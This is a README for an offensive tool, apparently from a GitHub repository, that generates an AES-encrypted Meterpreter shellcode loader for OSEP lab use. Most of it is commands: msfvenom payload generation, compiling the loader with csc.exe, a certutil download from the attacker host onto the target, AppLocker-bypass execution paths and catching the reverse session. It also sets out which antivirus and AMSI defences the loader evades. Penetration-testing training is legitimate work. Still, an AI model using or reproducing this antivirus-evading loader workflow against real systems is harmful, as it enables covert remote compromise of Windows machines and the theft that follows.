# AESLoader

> Automated AES-128-CBC encrypted shellcode loader generator for OffSec PEN-300 (OSEP) lab environments.

[![License: GPL-3.0](https://img.shields.io/badge/License-GPL%203.0-blue.svg)](https://opensource.org/licenses/GPL-3.0)
[![Platform: Kali Linux](https://img.shields.io/badge/Platform-Kali%20Linux-557C94)](https://www.kali.org/)
[![Shell: Bash](https://img.shields.io/badge/Shell-Bash-green.svg)](https://www.gnu.org/software/bash/)

AESLoader automates the generation of an AES-128-CBC encrypted Meterpreter shellcode loader. Each run produces a unique key and IV, encrypts the msfvenom payload, generates a ready-to-compile C# source file, and launches a Metasploit listener — all in one shot.

---

## 🚀 Features

- ✅ **Random AES-128-CBC Key & IV**: New encryption keys generated on every run — no two payloads are identical
- ✅ **Encrypted Payload**: Shellcode encrypted and Base64-encoded before embedding in the loader
- ✅ **Ready-to-Compile C#**: Generates `NotMalware.cs` with the decryption stub and execution chain baked in
- ✅ **Auto Cleanup**: Removes leftover files from previous runs automatically
- ✅ **Integrated Listener**: Launches Metasploit multi/handler automatically after payload generation
- ✅ **Low Privilege Friendly**: Runs as standard user — no admin required on target for self-injection

---

## 📋 Prerequisites

### On Kali / Parrot (Attack Box)

| Tool | Pre-installed | Action |
|---|---|---|
| msfvenom | ✅ Yes | None |
| openssl | ✅ Yes | None |
| msfconsole | ✅ Yes | None |
| git | ❌ No | `sudo apt install git -y` |

### On Windows (Compilation Host)

No installs needed — uses the built-in .NET Framework compiler (`csc.exe`) present on all modern Windows systems.

---

## 📦 Installation
```bash
git clone https://github.com/Y3llowDuck/OSEP.git
cd OSEP/AESLoader
chmod +x shell.sh
```

---

## 🎯 Usage
```bash
./shell.sh
```

> Use `sudo ./shell.sh` only when binding to ports 80 or 443. For ports 4444/8443 no sudo needed.

Enter `LHOST` and `LPORT` when prompted.

### Example Session
```bash
$ ./shell.sh
[*] Cleaning up leftovers from previous runs...
[?] Enter LHOST: 10.10.15.201
[?] Enter LPORT: 443
[*] LHOST: 10.10.15.201 | LPORT: 443
[*] Key (hex): 7e9798ccb9543d21f2a32b1751ee58b9
[*] IV  (hex): 028b796dc6945e736a09f6af4f37846b
[*] Payload size: 716 bytes
[*] Generating C# source: /tmp/NotMalware.cs
[*] Done. C# source saved to: /tmp/NotMalware.cs
[*] Transfer NotMalware.cs to Windows and compile with:
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:NotMalware.exe NotMalware.cs
[*] Launching Metasploit listener on 0.0.0.0:443...
```

---

## 🔄 Workflow
```
Kali: ./shell.sh → /tmp/NotMalware.cs
        ↓
Windows: csc.exe → NotMalware.exe
        ↓
Target: execute NotMalware.exe → Meterpreter session
```

---

## 🛠️ Compile on Windows

Find `csc.exe` on any Windows machine:
```powershell
Get-ChildItem -Path 'C:\Windows\Microsoft.NET\Framework64\csc.exe' -Recurse -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
```

Compile:
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:NotMalware.exe NotMalware.cs
```

Result is a single clean exe with no DLL dependencies — targets .NET Framework 4.x which is built into all modern Windows systems.

---

## 📤 Transfer to Target

Serve from Kali:
```bash
cd /tmp && python3 -m http.server 8080
```

Download on target:
```powershell
certutil -urlcache -split -f http://LHOST:8080/NotMalware.exe C:\Windows\Temp\NotMalware.exe
```

Or compile directly on the target if you have code execution:
```powershell
certutil -urlcache -split -f http://LHOST:8080/NotMalware.cs C:\Windows\Temp\NotMalware.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\NotMalware.exe C:\Windows\Temp\NotMalware.cs
```

---

## ▶️ Execute on Target
```powershell
C:\Windows\Temp\NotMalware.exe
```

### AppLocker Bypass Paths

If AppLocker blocks execution try these commonly whitelisted writable paths:

| Path |
|---|
| `C:\Windows\Temp\` |
| `C:\Windows\tracing\` |
| `C:\Windows\System32\spool\drivers\color\` |

---

## 🎯 Catch the Session

Meterpreter session opens automatically in the listener window.
```
sessions -l
sessions -i <id>
```

---

## ⚙️ How It Works

1. **Cleanup**: Removes any leftover files from previous runs
2. **Prompt**: Asks for LHOST and LPORT
3. **Keygen**: Generates a random 16-byte AES key and IV
4. **Shellcode**: Runs msfvenom to generate raw shellcode
5. **Encrypt**: AES-128-CBC encrypts the shellcode with PKCS7 padding
6. **Encode**: Base64-encodes the encrypted blob
7. **Generate**: Writes `NotMalware.cs` with key, IV, and payload baked in
8. **Listen**: Launches Metasploit multi/handler automatically

---

## 🔐 Security Notes

### AES Encryption
- Mode: CBC
- Key size: 128-bit (16 bytes)
- Padding: PKCS7
- Key and IV: Randomly generated per run — no two payloads share the same encryption

### What This Bypasses
- ✅ Static AV signature detection — encrypted blob on disk is unrecognizable
- ✅ PowerShell-specific defenses (AMSI, Script Block Logging, CLM) — pure C# binary

### What This Does NOT Bypass
- ❌ Behavioral detection of VirtualAlloc → VirtualProtect → CreateThread chain
- ❌ EDR userland API hooks
- ❌ ETW kernel logging

---

## ⚠️ Important Notes

- Use `sudo ./shell.sh` when binding to ports 80 or 443
- The C# loader uses self-injection — no admin required on target
- AppLocker blocking is expected in hardened PEN300 lab environments — path bypass is the intended next step
- Each run generates a completely new payload — reuse the script for every engagement

---

## 🐛 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `Permission denied` on `/tmp/payload.b64` | Leftover from previous `sudo` run | Script handles this automatically |
| `Permission denied - bind` on listener | Port below 1024 | Run with `sudo` or use port 4444/8443 |
| `AppLocker blocked` | Group Policy restriction | Execute from a whitelisted path |
| No session received | Firewall blocking port | Switch to `reverse_http` on port 80 |

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## 📝 License

This project is licensed under the GPL-3.0 License - see the [LICENSE](../LICENSE) file for details.

---

## ⭐ Acknowledgments

- Created for the OffSec community
- Inspired by the need for a quick, repeatable AV evasion workflow during PEN300 labs
- Special thanks to all OSEP students grinding through the challenge labs!

---

## 📧 Support

If you find this tool helpful, please ⭐ star the repository!

For issues, questions, or suggestions:
- Open an [Issue](https://github.com/Y3llowDuck/OSEP/issues)
- Submit a [Pull Request](https://github.com/Y3llowDuck/OSEP/pulls)

---

## 🔗 Related Projects

Check out my other free pentesting tools:
- [OctetSwap](https://github.com/Y3llowDuck/OSEP/tree/main/OctetSwap) - Automated /etc/hosts octet replacement for lab resets
- [RevShellGenerator](https://github.com/Y3llowDuck/OSEP/tree/main/RevShellGenerator) - Polymorphic PowerShell reverse shell generator
- [More tools](https://github.com/Y3llowDuck?tab=repositories) - Browse all repositories

---

**Happy Hacking! 🎯**

*Disclaimer: This tool is intended for authorized penetration testing only. Use responsibly and ethically.*
